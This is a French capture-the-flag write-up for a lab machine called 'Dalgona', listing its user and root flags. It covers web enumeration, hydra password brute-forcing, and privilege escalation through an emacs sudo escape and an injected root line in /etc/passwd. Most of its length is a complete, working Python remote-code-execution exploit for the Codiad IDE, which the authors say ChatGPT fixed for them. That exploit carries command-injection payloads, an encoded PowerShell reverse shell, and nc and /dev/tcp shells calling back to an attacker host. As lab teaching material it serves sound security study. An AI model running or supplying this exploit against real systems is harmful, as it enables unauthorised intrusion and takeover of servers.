# Dalgona 🔳🔳

## Récupération du `user.txt`

> EPI{900d_ra1n_kN0w2_73H_B357_71m3_70_phALL}

En utilisant gobuster on s'aperçoit qu'un url `/lick` est disponible sur localhost.

```bash
gobuster dir -u <target> -w <wordlist_path>
```

![01](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/53731384-bc7e-4dc5-b261-e5fff22d563f)

En accédant à la page `http://<target>/lick`, on arrive sur une page de connexion.

![03](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/4603b698-081f-45ef-828a-a59864ae8569)

On peut bruteforcer le mot de passe de l'utilisateur `player456` grâce à `hydra`.

```bash
hydra -l player456 -P <wordlist> <target> http-get /lick/ide/ -I -t 64
```

![02](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/1e10361b-23c0-46f8-8411-7754fc207587)

> Le mot de passe est `sugardaddy`

En entrant les identifiants de l'utilisateur `player456` on accède à l'interface de `Codiad`.

![04](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/552fb472-bda5-4c19-b59d-105862b4843a)

En cherchant sur internet, on est tombés sur [ce repository](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit) qui permet d'exploiter des failles sur `Codiad`. En donnant ce code à chatgpt car il n'était plus fonctionnel, il nous a ressortit le code ci-dessous.

![09](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/8d1357e7-bb60-4f25-b428-6b6500c19520)

```python
#!/usr/bin/env python
# encoding: utf-8

import requests
import sys
import json
import base64

session = requests.Session()

def login(domain, username, password):
    global session
    url = domain + "/components/user/controller.php?action=authenticate"
    data = {
        "username": username,
        "password": password,
        "theme": "default",
        "language": "en"
    }
    response = session.post(url, data=data, verify=False)
    content = response.content.decode('utf-8')
    print("[+] Login Content : %s" % (content))
    if 'status":"success"' in content:
        return True


def get_write_able_path(domain):
    global session
    url = domain + "/components/project/controller.php?action=get_current"
    response = session.get(url, verify=False)
    content = response.content.decode('utf-8')
    print("[+] Path Content : %s" % (content))
    json_obj = json.loads(content)
    if json_obj['status'] == "success":
        return json_obj['data']['path']
    else:
        return False


def base64_encode_2_bytes(host, port):
    payload = '''
    $client = New-Object System.Net.Sockets.TCPClient("__HOST__",__PORT__);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..255|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    $client.Close();
    '''
    result = ""
    for i in payload.replace("__HOST__", host).replace("__PORT__", str(port)):
        result += i + "\x00"
    return base64.b64encode(result.encode('utf-16le')).decode('utf-8').replace("\n", "")


def build_powershell_payload(host, port):
    preffix = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc "
    return preffix + base64_encode_2_bytes(host, port).replace("+", "%2b")


def exploit(domain, username, password, host, port, path, platform):
    global session
    url = domain + "components/filemanager/controller.php?type=1&action=search&path=%s" % (path)
    if platform.lower().startswith("win"):
        # new version escapeshellarg
        # escapeshellarg on windows will quote the arg with ""
        # so we need to try twice
        payload = '||%s||' % (build_powershell_payload(host, port))
        payload = "search_string=Hacker&search_file_type=" + payload
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.content.decode('utf-8')
        print(content)

        # old version escapeshellarg
        payload = '%%22||%s||' % (build_powershell_payload(host, port))
        payload = "search_string=Hacker&search_file_type=" + payload
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.content.decode('utf-8')
        print(content)
    else:
        # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ'''
        payload = '"%%0Anc %s %d|/bin/bash %%23' % (host, port)
        payload = "search_string=Hacker&search_file_type=" + payload
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.content.decode('utf-8')
        print(content)


def promote_yes(hint):
    print(hint)
    while True:
        ans = input("[Y/n] ").lower()
        if ans == 'n':
            return False
        elif ans == 'y':
            return True
        else:
            print("Incorrect input")


def main():
    if len(sys.argv) != 7:
        print("Usage : ")
        print("        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
        print("        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
        print("Example : ")
        print("        python %s http://localhost/ admin admin 8.8.8.8 8888 linux" % (sys.argv[0]))
        print("        python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows" % (sys.argv[0]))
        print("Author : ")
        print("        WangYihang <wangyihanger@gmail.com>")
        exit(1)
    domain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    host = sys.argv[4]
    port = int(sys.argv[5])
    platform = sys.argv[6]
    if platform.lower().startswith("win"):
        print("[+] Please execute the following command on your vps: ")
        print("nc -lnvp %d" % (port))
        if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
            exit(1)
    else:
        print("[+] Please execute the following command on your vps: ")
        print("echo 'bash -c \"bash -i >/dev/tcp/%s/%d 0>&1 2>&1\"' | nc -lnvp %d" % (host, port + 1, port))
        print("nc -lnvp %d" % (port + 1))
        if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
            exit(1)
    print("[+] Starting...")
    if not login(domain, username, password):
        print("[-] Login failed! Please check your username and password.")
        exit(2)
    print("[+] Login success!")
    print("[+] Getting writeable path...")
    path = get_write_able_path(domain)
    if path == False:
        print("[+] Get current path error!")
        exit(3)
    print("[+] Writeable Path : %s" % (path))
    print("[+] Sending payload...")
    exploit(domain, username, password, host, port, path, platform)
    print("[+] Exploit finished!")
    print("[+] Enjoy your reverse shell!")


if __name__ == "__main__":
    main()
```

On exécute alors le script `exploit.py` en lui passant les informations correspondantes.

```bash
python exploit.py http://player456:suggardaddy@10.10.216.64/lick/ide/ player456 sugardaddy <target> 4444 linux
```

![05](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/b68c68eb-2133-473d-9e7a-5dfe7a195432)

Le script précédemment exécuté nous indique de lancer deux autres commandes simultanément. On ouvre alors un autre terminal pour y exécuter la seconde.

![06](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/e9db2a22-b0d4-416e-bc6c-7b417e84bf74)

Puis enfin un dernier terminal qui sera celui dans lequel le reverse shell s'ouvrira.

![07](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/f16ff018-f80b-4031-bec0-59197c3f99ce)

Une fois ouvert, nous avons seulement de le temps de nous aperçevoir que le fichier `user.txt` se trouver dans `/home/player456/`, et ce avant que le terminal se ferme.

![08](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/da9159b7-c1ad-4263-9d0b-20f8935b1f64)

La commande `script -q /dev/null` à exécuter dans le reverse shell permet au terminal de ne pas s'exit automatiquement.

![10](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/b9c1ac7c-bef5-4632-8e91-1dcb4899ede1)

On est donc connecté en tant que `www-data` et il va désormais falloir que nous nous connections en tant que `player456`.

En utilisant `sudo -l`, on s'aperçoit que `player456` a la permission d'utiliser `emacs` en sudo.

```bash
sudo -u player456 TERM=xterm emacs -Q -nw --eval '(term "/bin/sh")'
```

Cette commande utilise sudo pour exécuter une commande en tant qu'un autre utilisateur (player456), en définissant certaines variables d'environnement et en lançant Emacs dans un terminal avec une configuration minimale, tout en ouvrant un sous-shell. Voici une explication détaillée de chaque partie de la commande :

`sudo -u player456`:

- `sudo` : Permet d'exécuter une commande avec les privilèges d'un autre utilisateur.
- `-u player456` : Spécifie que la commande doit être exécutée en tant qu'utilisateur player456.

`TERM=xterm`:

Définit la variable d'environnement TERM à xterm. Cela indique au programme qu'il doit se comporter comme s'il était exécuté dans un terminal de type xterm.

`emacs -Q -nw`:

`emacs` : Lance l'éditeur de texte Emacs.
`-Q` : Démarre Emacs sans charger les fichiers de configuration initiaux (.emacs, init.el, etc.), ce qui permet d'avoir une configuration minimale.
`-nw` : Lance Emacs en mode "no window", c'est-à-dire sans l'interface graphique, dans le terminal.
`--eval` : '(term "/bin/sh")' :

`--eval` : Indique à Emacs d'évaluer l'expression Lisp qui suit.
`'(term "/bin/sh")'` : L'expression Lisp qui démarre un terminal Emacs (term) exécutant un shell /bin/sh.

En résumé, cette commande :

Utilise sudo pour changer d'utilisateur et exécuter la commande suivante en tant qu'utilisateur player456.
Lance Emacs dans le terminal avec une configuration minimale et sans interface graphique.
Ouvre un sous-shell (/bin/sh) à l'intérieur d'Emacs.

![11](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/a0f2d8a2-f88a-4d60-8f1d-17a1ce4568e8)

Une fois connecté en tant que `player456` on peut lire le contenu du fichier `user.txt`.

```bash
cat /home/player456/user.txt
```

![12](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/ec63d014-ef09-405b-936b-b4de44f89919)

## Récupération du `root.txt`

> EPI{F0rTy_F1V3_P01nt_S1X_b1ll10n}

On faisant `sudo -l` on s'aperçoit que l'utilisateur a la permission d'exécution `sudo` sur le binaire `/usr/bin/squidgame`. Qui permet entre autre d'écrire dans des fichiers, on pourrait alors tenter d'ajouter un utilisateur ayant les mêmes permissions que `root` dans le fichier `/etc/passwd`.

```bash
head /etc/passwd
```

![13](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/4d0d8968-696c-4710-91f8-97b794ab2181)

On génère alors le mot de passe que l'on va assigner à l'utilisateur à l'aide de la commande ci-dessous.

```bash
pass=$(openssl passwd -6 -salt gougougaga gougou)
```

![14](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/994f8ef9-9d96-4ad1-bf7b-3b4b8c586d82)

On ajoute ensuite l'utilisateur dans le fichier `/etc/passwd`.

```bash
echo "gougougaga:$pass:0:0:/root:/bin/bash" | sudo /usr/bin/squidgame -a /etc/passwd
```

![16](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/f2f602e3-70d0-4b6b-91b5-f0d0c58c5468)

On peut alors se connecter à l'utilisateur (la commande nous connecte à `root` car il possède le mêmme id).
 
```bash
su gougougaga
```

Une fois que nous avons les permissions d'accéder au dossier `/root` on peut alors lire le contenu du fichier `root.txt`

```bash
cat /root/root.txt
```

![17](https://github.com/EpitechMscProPromo2026/T-SEC-600-STG_11/assets/91117127/620ae4e9-eb02-4bbf-81f1-5a18b8583674)
